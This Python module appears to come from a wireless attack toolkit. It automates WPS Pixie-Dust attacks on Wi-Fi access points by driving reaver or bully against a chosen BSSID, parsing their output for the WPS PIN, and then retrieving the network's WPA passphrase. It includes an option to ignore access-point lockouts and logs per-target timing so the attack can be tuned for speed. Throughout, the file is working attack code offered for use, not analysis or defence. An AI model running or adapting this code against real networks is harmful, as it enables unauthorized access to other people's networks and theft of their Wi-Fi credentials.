# -*- coding: utf-8 -*-
"""WPS **pixie-dust only** via reaver (bully fallback).

Online PIN brute-force is intentionally never used — modern APs rate-limit /
lock WPS, so grinding PINs wastes the Rush window. Flow per AP:

  BEACON → ASSOC → collect M1..M3 → pixiewps offline → PIN → GETPSK (reaver -p)

If pixie fails (or reaver tries to fall into online BF), we kill and move on.

Structured one-liners for tuning (grep `wps-metric`):
  [attack] wps-metric bssid=.. result=pin|fail reason=.. t_beacon=.. t_m3=.. t_total=..
"""
import os
import re
import select
import shutil
import subprocess
import time

import config
from attack import interface as iface_mod
from attack import tools
from attack.model import AttackEvent, EventType


PIN_RE = re.compile(
    r"(?:WPS PIN|PIN FOUND|Pin is|setting pin to)\s*:?\s*'?([0-9]{4,8})'?",
    re.I)
PSK_RE = re.compile(
    r"(?:WPA PSK|key is)\s*:?\s*'([^']*)'|(?:WPA PSK)\s*:\s*(\S+)",
    re.I)
# Pixie offline failed — stop (do not continue into PIN grind).
PIXIE_FAIL_RE = re.compile(
    r"pin not found|WPS pin not found|pixie-?dust.*fail|Pixiewps fail|"
    r"Pixiewps timeout|Pixiewps fail, sending|"
    r"trying -f \(full PRNG|full PRNG brute force|"
    r"failed to recover WPA key",
    re.I)
# Reaver fell into online PIN brute-force — abort immediately.
PIN_BF_RE = re.compile(
    r"%\s*complete\s*@"
    r"|Nothing done, nothing to save"
    r"|Max pin attempts"
    r"|Starting Cracking Session"
    r"|Pin count:",
    re.I)
# After pixiewps has run (success or fail path), any "Trying pin" is online BF.
TRYING_PIN_RE = re.compile(r"Trying pin\s+[\"']?\d{4,8}", re.I)
WPS_OFF_RE = re.compile(r"AP seems to have WPS turned off", re.I)
RECOVER_FAIL_RE = re.compile(r"failed to recover WPA key", re.I)
HARD_LOCK_RE = re.compile(
    r"WPS lock(?:out)?|AP (?:is )?locked|WARNING.*(?:WPS )?lock",
    re.I)
BEACON_RE = re.compile(r"Received beacon from", re.I)
ASSOC_RE = re.compile(r"Associated with", re.I)
M1_RE = re.compile(r"Received M1\b", re.I)
M3_RE = re.compile(r"Received M3\b", re.I)
PIXIE_RUN_RE = re.compile(
    r"Starting Pixie|Pixiewps:|Pixie-Dust|Running pixiewps", re.I)
EXCHANGE_RE = re.compile(
    r"Associated with|Received M[1-7]|Starting Pixie|Pixiewps:|"
    r"Sending EAPOL|EAPOL start",
    re.I)

GETPSK_TIMEOUT = 120
BEACON_SOFT_SEC = 15
ASSOC_SOFT_SEC = 35

_STDBUF = shutil.which("stdbuf") or (
    "/usr/bin/stdbuf" if os.path.exists("/usr/bin/stdbuf") else None)


def _psk_from_line(line):
    m = PSK_RE.search(line)
    if not m:
        return None
    return m.group(1) if m.group(1) is not None else m.group(2)


def _session_paths(bssid):
    raw = (bssid or "").replace(":", "").replace("-", "")
    names = [raw.upper(), raw.lower()]
    paths = []
    for base in ("/var/lib/reaver", "/etc/reaver"):
        for name in names:
            if name:
                paths.append(os.path.join(base, "%s.wpc" % name))
    return paths


def _clear_session(bssid):
    for path in _session_paths(bssid):
        try:
            os.remove(path)
            tools.log("wps: cleared session %s" % path)
        except OSError:
            pass


def _stop_proc(proc):
    if not proc:
        return
    try:
        if proc.stdin:
            try:
                proc.stdin.close()
            except Exception:  # noqa: BLE001
                pass
        proc.terminate()
        proc.wait(timeout=3)
    except Exception:  # noqa: BLE001
        try:
            proc.kill()
        except Exception:  # noqa: BLE001
            pass


def _spawn(cmd, clear_bssid=None):
    if clear_bssid:
        _clear_session(clear_bssid)
    real = list(cmd)
    if _STDBUF and real and "bully" not in os.path.basename(real[0]):
        real = [_STDBUF, "-oL", "-eL"] + real
    tools.log("wps spawn: %s" % " ".join(real))
    proc = subprocess.Popen(
        real, stdin=subprocess.PIPE, stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT, bufsize=1, text=True)
    try:
        if proc.stdin:
            proc.stdin.write("n\n")
            proc.stdin.flush()
    except Exception:  # noqa: BLE001
        pass
    return proc


def _drain_psk(proc):
    if not proc or not proc.stdout:
        return None
    try:
        ready, _, _ = select.select([proc.stdout.fileno()], [], [], 0.3)
        if not ready:
            return None
        rest = proc.stdout.read() or ""
    except Exception:  # noqa: BLE001
        return None
    psk = None
    for line in rest.splitlines():
        tools.log("wps drain: %s" % line.strip())
        got = _psk_from_line(line)
        if got is not None:
            psk = got
    return psk


def _metric(fields):
    """One parseable line for post-run timing optimization."""
    parts = []
    for k in sorted(fields.keys()):
        v = fields[k]
        if v is None or v == "":
            continue
        if isinstance(v, float):
            parts.append("%s=%.2f" % (k, v))
        else:
            s = str(v).replace(" ", "_")[:48]
            parts.append("%s=%s" % (k, s))
    tools.log("wps-metric " + " ".join(parts))


def _build_cmd(tool, mon, target, ignore_locks):
    """Pixie-dust only — never launch plain online PIN crack mode."""
    bssid = target["bssid"]
    channel = str(target.get("channel") or "")
    if tool == "bully":
        # bully -d = pixie dust
        cmd = [tools.BULLY, "-b", bssid, "-d", "-v", "3"]
        if channel:
            cmd += ["-c", channel]
        if ignore_locks:
            cmd.append("-L")
        cmd.append(mon)
        return cmd
    # reaver -K 1 = pixie; we kill the process if it tries online BF afterward
    cmd = [tools.REAVER, "-i", mon, "-b", bssid, "-K", "1", "-N", "-vv"]
    if channel:
        cmd += ["-c", channel]
    if ignore_locks:
        cmd.append("-L")
    return cmd


def pixie(mon, target, req, emit, stop_flag):
    """Pixie-dust only. Returns {"ok","psk","pin","essid","bssid"}."""
    bssid = target["bssid"]
    essid = target.get("essid") or bssid
    channel = target.get("channel")
    signal = target.get("signal")
    tool = config.opt_state(req.attack_modes, "WPS Tool", "reaver")
    ignore_locks = config.opt_bool(req.attack_modes, "Ignore Locks", False)
    timeout = config.opt_int(req.timing, "WPS Timeout", 180)
    beacon_soft = min(BEACON_SOFT_SEC, max(3, timeout // 3))
    assoc_soft = min(ASSOC_SOFT_SEC, max(beacon_soft + 5, timeout - 5))

    bin_path = tools.BULLY if tool == "bully" else tools.REAVER
    if not tools.tool_ok(bin_path):
        emit(AttackEvent(EventType.FAILED, essid=essid, bssid=bssid,
                         detail="%s missing" % tool))
        return {"ok": False, "essid": essid, "bssid": bssid}

    iface_mod.lock_channel(mon, channel)
    cmd = _build_cmd(tool, mon, target, ignore_locks)
    tools.log("wps pixie-only: timeout=%ss beacon=%ss assoc=%ss ch=%s" % (
        timeout, beacon_soft, assoc_soft, channel))
    try:
        proc = _spawn(cmd, clear_bssid=bssid)
    except Exception as e:  # noqa: BLE001
        emit(AttackEvent(EventType.FAILED, essid=essid, bssid=bssid,
                         detail=str(e)[:20]))
        return {"ok": False, "essid": essid, "bssid": bssid}

    start = time.time()
    pin = None
    psk = None
    fail_reason = None
    saw_beacon = False
    saw_exchange = False
    saw_pixie_run = False
    t_beacon = t_assoc = t_m1 = t_m3 = t_pixie = t_pin = None
    m1_count = 0
    result = {"ok": False, "essid": essid, "bssid": bssid}
    fd = proc.stdout.fileno()

    def elapsed():
        return time.time() - start

    try:
        while True:
            if stop_flag and stop_flag.is_set():
                fail_reason = "cancelled"
                result["cancelled"] = True
                break
            now = elapsed()
            if now > timeout:
                fail_reason = "timeout"
                emit(AttackEvent(EventType.FAILED, essid=essid, bssid=bssid,
                                 detail="timeout"))
                break

            if not saw_beacon and now > beacon_soft:
                fail_reason = "no beacon"
                tools.log("wps SOFT: no beacon %ss %s" % (beacon_soft, bssid))
                emit(AttackEvent(EventType.FAILED, essid=essid, bssid=bssid,
                                 detail="no beacon"))
                break
            if saw_beacon and not saw_exchange and now > assoc_soft:
                fail_reason = "no assoc"
                tools.log("wps SOFT: no assoc %ss %s" % (assoc_soft, bssid))
                emit(AttackEvent(EventType.FAILED, essid=essid, bssid=bssid,
                                 detail="no assoc"))
                break

            if not saw_beacon:
                phase, left, mx = ("BEACON",
                                   max(0, int(beacon_soft - now)), beacon_soft)
            elif not saw_exchange:
                phase, left, mx = ("ASSOC",
                                   max(0, int(assoc_soft - now)), assoc_soft)
            else:
                phase, left, mx = ("PIXIE",
                                   max(0, int(timeout - now)), timeout)

            ready, _, _ = select.select([fd], [], [], 0.5)
            if not ready:
                emit(AttackEvent(EventType.PHASE, essid=essid, bssid=bssid,
                                 phase=phase, countdown=left, cd_max=mx,
                                 signal=signal))
                continue
            line = proc.stdout.readline()
            if not line:
                break
            line = line.strip()
            if not line:
                continue
            tools.log("wps pixie: %s" % line)

            if BEACON_RE.search(line):
                if not saw_beacon:
                    t_beacon = elapsed()
                    tools.log("wps: beacon OK %s" % bssid)
                saw_beacon = True
            if ASSOC_RE.search(line) and t_assoc is None:
                t_assoc = elapsed()
            if M1_RE.search(line):
                m1_count += 1
                if t_m1 is None:
                    t_m1 = elapsed()
            if M3_RE.search(line) and t_m3 is None:
                t_m3 = elapsed()
            if PIXIE_RUN_RE.search(line):
                saw_pixie_run = True
                if t_pixie is None:
                    t_pixie = elapsed()
            if EXCHANGE_RE.search(line):
                if not saw_exchange:
                    tools.log("wps: exchange started %s" % bssid)
                saw_beacon = True
                saw_exchange = True

            if WPS_OFF_RE.search(line):
                fail_reason = "wps off"
                emit(AttackEvent(EventType.FAILED, essid=essid, bssid=bssid,
                                 detail="wps off"))
                break
            # Pixie offline failed — do NOT continue into PIN brute-force.
            if PIXIE_FAIL_RE.search(line):
                fail_reason = "pixie fail"
                tools.log("wps: pixie fail — skip online BF %s" % bssid)
                emit(AttackEvent(EventType.FAILED, essid=essid, bssid=bssid,
                                 detail="no pin"))
                break
            if PIN_BF_RE.search(line) or (
                    saw_pixie_run and TRYING_PIN_RE.search(line) and not pin):
                fail_reason = "pin bf"
                tools.log("wps: block online PIN BF %s" % bssid)
                emit(AttackEvent(EventType.FAILED, essid=essid, bssid=bssid,
                                 detail="pin bf"))
                break
            # Before pixie has run, ignore "Trying pin 12345670" handshake noise.

            m = PIN_RE.search(line)
            if m:
                pin = m.group(1)
                t_pin = elapsed()
                saw_exchange = True
                tools.log("wps: PIXIE PIN %s %s" % (pin, bssid))
                break
            got = _psk_from_line(line)
            if got is not None:
                psk = got
                saw_exchange = True
                break
            if HARD_LOCK_RE.search(line) and not ignore_locks:
                fail_reason = "wps lock"
                emit(AttackEvent(EventType.FAILED, essid=essid, bssid=bssid,
                                 detail="wps lock"))
                break
            emit(AttackEvent(EventType.PHASE, essid=essid, bssid=bssid,
                             phase=phase, countdown=left, cd_max=mx,
                             signal=signal))
    finally:
        _stop_proc(proc)

    t_getpsk = None
    if pin and psk is None and not (stop_flag and stop_flag.is_set()):
        gp_start = time.time()
        time.sleep(1.0)
        emit(AttackEvent(EventType.PHASE, essid=essid, bssid=bssid,
                         phase="GETPSK", countdown=GETPSK_TIMEOUT,
                         cd_max=GETPSK_TIMEOUT, signal=signal))
        psk = _recover_psk(mon, target, pin, emit, essid, bssid, stop_flag,
                           tool=tool, ignore_locks=True,
                           timeout=GETPSK_TIMEOUT)
        t_getpsk = time.time() - gp_start

    t_total = elapsed()
    if psk is not None or pin:
        emit(AttackEvent(EventType.CRACKED, essid=essid, bssid=bssid,
                         credential=psk, pin=pin))
        result = {"ok": True, "psk": psk, "pin": pin,
                  "essid": essid, "bssid": bssid}
        fail_reason = None
        outcome = "psk" if psk else "pin"
    else:
        outcome = "fail"
        if not fail_reason:
            fail_reason = "no pin"

    _metric({
        "bssid": bssid,
        "essid": essid,
        "ch": channel,
        "sig": signal,
        "tool": tool,
        "result": outcome,
        "reason": fail_reason or "ok",
        "pin": pin,
        "timeout": timeout,
        "beacon_soft": beacon_soft,
        "assoc_soft": assoc_soft,
        "t_beacon": t_beacon,
        "t_assoc": t_assoc,
        "t_m1": t_m1,
        "t_m3": t_m3,
        "t_pixie": t_pixie,
        "t_pin": t_pin,
        "t_getpsk": t_getpsk,
        "t_total": t_total,
        "m1_n": m1_count,
    })
    return result


def recover_psk(iface, target, pin, emit, stop_flag=None, timeout=GETPSK_TIMEOUT):
    essid = target.get("essid") or target.get("bssid")
    bssid = target.get("bssid")
    recovered = iface_mod.ensure_external()
    if recovered:
        iface = recovered
    name = iface_mod.iface_name(iface)
    tool = "bully" if (not tools.tool_ok(tools.REAVER)
                       and tools.tool_ok(tools.BULLY)) else "reaver"
    bin_path = tools.BULLY if tool == "bully" else tools.REAVER
    if not tools.tool_ok(bin_path):
        emit(AttackEvent(EventType.FAILED, essid=essid, bssid=bssid,
                         detail="%s missing" % tool))
        return None
    try:
        with iface_mod.monitor_mode(name) as mon:
            return _recover_psk(mon, target, pin, emit, essid, bssid,
                                stop_flag, timeout=timeout, tool=tool,
                                ignore_locks=True)
    except RuntimeError as e:
        emit(AttackEvent(EventType.FAILED, essid=essid, bssid=bssid,
                         detail=str(e)[:20]))
        return None


def _recover_psk(mon, target, pin, emit, essid, bssid, stop_flag,
                 timeout=GETPSK_TIMEOUT, tool="reaver", ignore_locks=False):
    """Known-PIN → PSK only (not online BF). Uses reaver -p / bully -p."""
    bin_path = tools.BULLY if tool == "bully" else tools.REAVER
    if not tools.tool_ok(bin_path):
        emit(AttackEvent(EventType.FAILED, essid=essid, bssid=bssid,
                         detail="%s missing" % tool))
        return None
    iface_mod.lock_channel(mon, target.get("channel"))
    if tool == "bully":
        cmd = [tools.BULLY, "-b", bssid, "-p", str(pin), "-d", "-v", "3"]
        if target.get("channel"):
            cmd += ["-c", str(target["channel"])]
        if ignore_locks:
            cmd.append("-L")
        cmd.append(mon)
    else:
        cmd = [tools.REAVER, "-i", mon, "-b", bssid, "-p", str(pin), "-vv"]
        if target.get("channel"):
            cmd += ["-c", str(target["channel"])]
        if ignore_locks:
            cmd.append("-L")
    try:
        proc = _spawn(cmd, clear_bssid=bssid)
    except Exception:  # noqa: BLE001
        return None
    start = time.time()
    psk = None
    fail_detail = None
    fd = proc.stdout.fileno()
    try:
        while (time.time() - start) < timeout:
            if stop_flag and stop_flag.is_set():
                break
            ready, _, _ = select.select([fd], [], [], 0.5)
            if not ready:
                emit(AttackEvent(EventType.PHASE, essid=essid, bssid=bssid,
                                 phase="GETPSK",
                                 countdown=max(0, int(
                                     timeout - (time.time() - start))),
                                 cd_max=timeout))
                continue
            line = proc.stdout.readline()
            if not line:
                break
            line = line.strip()
            if not line:
                continue
            tools.log("wps psk-recover: %s" % line)
            got = _psk_from_line(line)
            if got is not None:
                psk = got
                break
            if re.search(r"rate limiting", line, re.I):
                continue
            if HARD_LOCK_RE.search(line) and not ignore_locks:
                fail_detail = "wps lock"
                break
            if RECOVER_FAIL_RE.search(line):
                fail_detail = "no psk"
                break
        else:
            fail_detail = fail_detail or "timeout"
    finally:
        _stop_proc(proc)
        if psk is None:
            drained = _drain_psk(proc)
            if drained is not None:
                psk = drained
    if psk is None and fail_detail and not (stop_flag and stop_flag.is_set()):
        emit(AttackEvent(EventType.FAILED, essid=essid, bssid=bssid,
                         detail=fail_detail))
    return psk
